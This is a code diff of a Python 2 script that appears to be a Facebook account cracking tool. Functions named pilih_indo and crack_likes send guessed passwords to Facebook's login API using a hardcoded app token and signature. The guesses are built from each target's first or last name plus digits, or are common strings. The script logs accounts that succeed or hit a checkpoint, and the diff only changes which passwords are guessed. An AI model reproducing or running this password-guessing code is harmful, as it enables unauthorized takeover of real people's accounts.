@@ -17,7 +17,7 @@ try:
 	import requests
 except ImportError:
 	os.system("pip2 install requests")
-	os.system("python2 UNIS3X.py")
+	os.system("python2 2020.py")
 from requests.exceptions import ConnectionError
 from mechanize import Browser 
 
@@ -290,7 +290,7 @@ def pilih_indo():
 					print '\033[1;93m | ' + user + ' • ' + pass1 + ' • ' + c['name']
 					cekpoint.append(user)
 				else:
-					pass2 = c['first_name']+'12345'
+					pass2 = c['first_name']+'1234'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					w = json.load(data)
 					if 'access_token' in w:
@@ -323,7 +323,7 @@ def pilih_indo():
 											print '\033[1;93m | ' + user + ' • ' + pass4 + ' • ' + c['name']
 											cekpoint.append(user)
 										else:
-											pass5 = c['last_name']+'12345'
+											pass5 = c['last_name']+'1234'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											w = json.load(data)
 											if 'access_token' in w:
@@ -356,7 +356,7 @@ def pilih_indo():
 																	print '\033[1;93m | ' + user + ' • ' + pass7 + ' • ' + c['name']
 																	cekpoint.append(user)
 																else:
-																	pass8 = 'Rahasia'
+																	pass8 = 'Kontol'
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	w = json.load(data)
 																	if 'access_token' in w:
@@ -367,7 +367,7 @@ def pilih_indo():
 																			print '\033[1;93m | ' + user + ' • ' + pass8 + ' • ' + c['name']
 																			cekpoint.append(user)
 																		else:
-																			pass9 = '123456'
+																			pass9 = '12345'
 																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																			w = json.load(data)
 																			if 'access_token' in w:
@@ -461,7 +461,7 @@ def crack_likes():
 							cek.close()
 							cekpoint.append(zowe)
 						else:
-							bos3 = j['first_name']+'12345'
+							bos3 = j['first_name']+'123'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							ko = json.load(data)
 							if 'access_token' in ko:
